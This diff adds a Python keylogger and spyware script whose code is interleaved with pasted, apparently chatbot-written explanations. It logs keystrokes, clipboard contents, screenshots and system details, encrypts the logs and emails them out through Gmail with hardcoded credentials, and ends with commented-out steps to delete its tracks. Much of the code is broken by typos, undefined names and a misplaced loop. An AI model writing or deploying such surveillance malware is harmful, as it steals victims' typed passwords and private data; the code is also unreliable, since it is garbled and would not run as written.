@@ -1,0 +1,459 @@
+
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+system_information = "syseinfo.txt"
+clipboard_information = "clipboard.txt"
+#audio_information = "audio.wav"
+screenshot_information = "screenshot.png"
+
+keys_information_e = "e_key_log.txt"
+system_information_e = "e_syseinfo.txt"
+clipboard_information_e = "e_clipboard.txt"
+
+#microphone_time = 10
+timeiteration = 15
+number_of_iterations_end = 3
+
+email_address = "pawarrudalib@gmail.com"
+password = "@rudali052001"
+
+username = getpass.getuser()
+
+toaddr = "pawarrudali@gmail.com"
+
+key = "4BjBP3SpHSVyin-ggJhYMiSQBo9FttelTd7GGTgT5ec="
+
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+file_merge = file_path + extend
+
+# email controls
+def send_email(filename, attachment, toaddr):
+
+    fromaddr = "pawarrudalib@gmail.com"
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'rb')
+
+    p = MIMEBase('application', 'octet_stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, "@rudali052001")
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+#send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+Explaination::
+
+It looks like you've provided a snippet of Python code for sending an email with an attachment. This code is designed to send an email using a Gmail account with a specified attachment. Here's an explanation of the code:
+
+Import Statements:
+
+python
+Copy code
+import getpass
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+These import statements bring in necessary modules and functions for working with email and attachments, as well as for getting the current user's name.
+
+Variable Declarations:
+
+python
+Copy code
+email_address = "email"
+password = "pass"
+toaddr = "email"
+key = "4BjBP3SpHSVyin-ggJhYMiSQBo9FttelTd7GGTgT5ec="
+file_path = "C:\\Users\\DELL\\PycharmProjects\\pythonProject5\\key2"
+extend = "\\"
+file_merge = file_path + extend
+These variables store email-related information, such as sender and recipient email addresses, email credentials, and file paths.
+
+send_email Function:
+
+python
+Copy code
+def send_email(filename, attachment, toaddr):
+This function is defined to send an email with an attachment. It takes three parameters: filename, attachment, and toaddr.
+
+Email Content:
+
+python
+Copy code
+fromaddr = "email"
+msg = MIMEMultipart()
+msg['From'] = fromaddr
+msg['To'] = toaddr
+msg['Subject'] = "Log File"
+body = "Body_of_the_mail"
+msg.attach(MIMEText(body, 'plain'))
+Here, an email message is created using MIMEMultipart. It sets the sender, recipient, subject, and attaches a plain text body.
+
+Attachment Handling:
+
+python
+Copy code
+filename = filename
+attachment = open(attachment, 'rb')
+p = MIMEBase('application', 'octet_stream')
+p.set_payload((attachment).read())
+encoders.encode_base64(p)
+p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+msg.attach(p)
+This part of the code handles the attachment. It opens the attachment file, encodes it as base64, and attaches it to the email message.
+
+SMTP Setup and Sending:
+
+python
+Copy code
+s = smtplib.SMTP('smtp.gmail.com', 587)
+s.starttls()
+s.login(fromaddr, "pass")
+text = msg.as_string()
+s.sendmail(fromaddr, toaddr, text)
+s.quit()
+This section establishes an SMTP connection to Gmail, starts TLS encryption, logs in using the provided email and password, converts the email message to a string, sends the email, and then quits the SMTP server.
+
+Finally, the send_email function is called with the appropriate parameters to send the email with the attachment. Please note that for security reasons, you should avoid hardcoding your email and password in your script. Consider using environment variables or a more secure method to store sensitive information. Additionally, make sure to use this code responsibly and only for legitimate purposes.
+
+You import the smtplib module.
+You configure the SMTP server settings (in this case, Gmail's SMTP server), including the server address, port, sender's email address, and sender's password.
+You create an SMTP client using smtplib.SMTP.
+You initiate a secure TLS connection using starttls.
+You log in to your email account using login.
+You compose an email message with a subject and message body.
+You use sendmail to send the email to the recipient.
+Finally, you quit the SMTP server using quit.
+
+
+
+
+#get the computer information
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify,org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get public ip address (most likely max query)")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("system: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
+computer_information()
+
+explaination :
+
+We import the platform module.
+We use various functions provided by the platform module to retrieve information about the current platform, including the operating system name (platform.system()), operating system version (platform.version()), and architecture (platform.architecture()).
+We also obtain additional system information such as the node name (the network name of the current machine), machine type (e.g., 'x86_64' for 64-bit), and processor name.
+The platform module can be helpful for writing platform-independent code or for tailoring your application's behavior based on the characteristics of the underlying operating system. It allows you to programmatically determine the runtime environment and adapt your code accordingly.
+
+# get the clipboard content
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data)
+
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+explaination ::
+
+The code you've provided is a Python function named copy_clipboard that attempts to copy the contents of the Windows Clipboard (if available) and append it to a file specified by file_path + extend + clipboard_information. If it encounters an error while attempting to copy the Clipboard data, it writes an error message to the file.
+
+Here's an explanation of the code:
+
+The copy_clipboard function is defined.
+
+It opens the specified file in append mode using a context manager (with open(...)).
+
+Within the try block, it attempts to access the Windows Clipboard using the win32clipboard module.
+
+It opens the Clipboard with win32clipboard.OpenClipboard().
+
+It attempts to retrieve the Clipboard data using win32clipboard.GetClipboardData().
+
+After obtaining the Clipboard data (if successful), it writes the data to the opened file along with a "Clipboard Data:" label.
+
+If any exception occurs during the process (e.g., if the Clipboard is empty or if there's an issue accessing it), it writes an error message to the file.
+
+The copy_clipboard function is called at the end to execute this code.
+
+A few things to note:
+
+You need to ensure that the win32clipboard module is available and properly installed on your system for this code to work.
+
+The variables file_path, extend, and clipboard_information are assumed to be defined elsewhere in your code. You should ensure that these variables contain the correct file path and information you want to use.
+
+Error handling is provided to catch exceptions that may occur when working with the Clipboard. This is a good practice as it prevents the script from crashing if something goes wrong during Clipboard access.
+
+Remember that when dealing with file paths in Python, it's important to use the correct path separators (backslashes on Windows) or consider using the os.path.join() function to construct paths in a platform-independent way.
+
+Ensure that the file specified in file_path + extend + clipboard_information exists or is created before running this code, as the code uses the file in append mode to write the Clipboard data or error message.
+
+Overall, the code appears to be designed to copy Clipboard data to a file while handling potential errors gracefully.
+
+
+#get the microphone information
+#def microphone():
+#   fs = 44100
+#   seconds = microphone_time
+
+#   myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+#   sd.wait()
+
+#    write(file_path + extend + audio_information, fs, myrecording)
+
+#microphone()
+
+expaination ::
+
+We import the necessary libraries: sounddevice (for audio recording) and scipy.io.wavfile (for saving audio as a WAV file).
+
+Inside the microphone function, we set the sample rate (fs) and the recording duration in seconds (seconds).
+
+We use sd.rec() to record audio from the microphone for the specified duration. The audio data is stored in the myrecording NumPy array.
+
+We use sd.wait() to wait for the recording to complete before proceeding.
+
+We specify the file path and filename for saving the recorded audio (file_path and audio_information variables).
+
+Finally, we use write() to save the recorded audio as a WAV file with the specified sample rate.
+
+Make sure to replace "C:\\path\\to\\save\\audio\\file" with the actual path where you want to save the audio file. Also, adjust the seconds variable to control the recording duration.
+
+
+
+
+# get screenshot
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path + extend + screenshot_information)
+
+screenshot()
+We import ImageGrab from Pillow.
+
+We use the ImageGrab.grab() function to capture a screenshot of the entire screen, and the result is stored in the screenshot variable.
+
+We display the captured screenshot using the show() method.
+
+The ImageGrab module also provides additional functions for capturing screenshots of specific regions or windows. It's a useful tool for automating tasks that involve capturing and processing screen content, such as creating screen recording applications, taking periodic desktop screenshots, or automating graphical user interface (GUI) testing.
+
+Keep in mind that the availability and functionality of the ImageGrab module may vary depending on your operating system and the Python environment you are using. Additionally, the Pillow library offers many other image processing capabilities beyond screen capturing.
+
+
+
+number_of_iterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + timeiteration
+
+#timers for keylogger
+while number_of_iterations < number_of_iterations_end:
+
+    count = 0
+    keys =[]
+
+def on_press(key):
+    global keys, count, currentTime
+
+    print(keys)
+    keys.append(key)
+    count += 1
+    currentTime = time.time()
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path + extend + keys_information, "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+    if currentTime > stoppingTime:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+    if currentTime > stoppingTime:
+
+        with open(file_path + extend + keys_information, "w") as f:
+            f.write(" ")
+
+            screenshot()
+            send_mail(screenshot_information, file_path + extend + screenshot_information, toaddr)
+
+            copy_clipboard()
+            number_of_iterations += 1
+
+            currentTime = time.time()
+            stoppingTime = time.time() + timeiteration
+
+explaination::
+
+
+
+It appears that the code you provided is a snippet of a Python script that is designed to function as a basic keylogger. I'll provide an overview of what this code does:
+
+Initialization: The script initializes various variables, including number_of_iterations, currentTime, and stoppingTime. These variables are used for controlling the duration of the keylogging process.
+
+Keylogger Loop: The code enters a while loop, which will run until number_of_iterations reaches a specified limit (number_of_iterations_end). This loop captures key presses and writes them to a log file.
+
+on_press Function: Inside the loop, there is an on_press function that is called every time a key is pressed. This function appends the pressed key to a list called keys, increments the count variable, and updates the currentTime.
+
+write_file Function: The write_file function is called when the count variable reaches a certain threshold (1 in this case). It writes the keys in the keys list to a log file.
+
+on_release Function: The on_release function is called when a key is released. If the "esc" key is pressed or if the current time exceeds the stoppingTime, it exits the keylogging process.
+
+Listener: The code creates a listener object using Listener from some library (possibly pynput). This listener is responsible for capturing key events and triggering the on_press and on_release functions.
+
+Main Loop: The script enters the listener's main loop with listener.join(). Inside this loop, key events are captured, and the keylogger operates.
+
+Conditional Actions: When the current time exceeds the stoppingTime, the script performs the following actions:
+
+Writes an empty space to the log file (possibly as a delimiter).
+Takes a screenshot.
+Sends an email with the screenshot as an attachment.
+Copies clipboard data.
+Increments the number_of_iterations.
+Updates currentTime and stoppingTime for the next iteration.
+It's important to note that the provided code is for educational purposes and demonstrates the basics of how a keylogger could work. However, the use of keyloggers for unauthorized access or monitoring of others' activities is unethical and may be illegal in many jurisdictions. Always ensure that you have proper authorization and adhere to legal and ethical guidelines when working with such code.
+
+
+
+# encrypt files
+files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
+encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge +keys_information_e]
+
+for encrypting_file in files_to_encrypt:
+
+    with open(files_to_encrypt[count],'rb') as f:
+        data = f.read()
+
+        fernet = Fernet(keys)
+        encypted = fernet.encrypt(data)
+
+        with open(encrypted_file_names[count], 'wb') as f:
+            f.write(encrypted)
+
+        send_email(encrypted_file_names[count], encypted_file_names[count], toaddr)
+        count += 1
+
+time.sleep(120)
+
+explaination::
+
+files_to_encrypt and encrypted_file_names are lists that contain file paths to files you want to encrypt and their corresponding encrypted file names, respectively.
+
+The code uses a for loop to iterate through each file in files_to_encrypt.
+
+Within the loop, it reads the contents of the current file using a binary read mode ('rb').
+
+It initializes a Fernet cipher object (fernet) using a key called keys. Ensure that keys is defined and contains a valid Fernet key.
+
+It encrypts the file's data using the Fernet cipher and stores the encrypted data in the encypted variable.
+
+It opens the corresponding encrypted file with write binary mode ('wb') and writes the encrypted data to it.
+
+After encrypting the file, it sends an email containing the encrypted file as an attachment using the send_email function. The email contains the encrypted file as an attachment and is sent to the email address specified in toaddr.
+
+The loop continues to the next file in the list, and the process repeats.
+
+After encrypting and sending all the files, the script sleeps for 120 seconds using time.sleep(120). This pause might be used to delay further execution of the script.
+
+A few points to keep in mind:
+
+Make sure that the keys variable is defined and contains a valid Fernet key before running this code.
+Verify that the send_email function is correctly implemented and has the necessary configurations to send emails.
+Ensure that the required modules (such as Fernet from the cryptography.fernet module and time) are properly imported.
+Double-check the paths and filenames in files_to_encrypt and encrypted_file_names to ensure they are correct and that the files exist.
+This code snippet is designed to encrypt specific files, send them via email, and introduce a delay between each iteration of the loop.
+
+
+
+# clean up our tracks
+#delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
+#for file in delete_files:
+   # os.remove(file_merge + file)
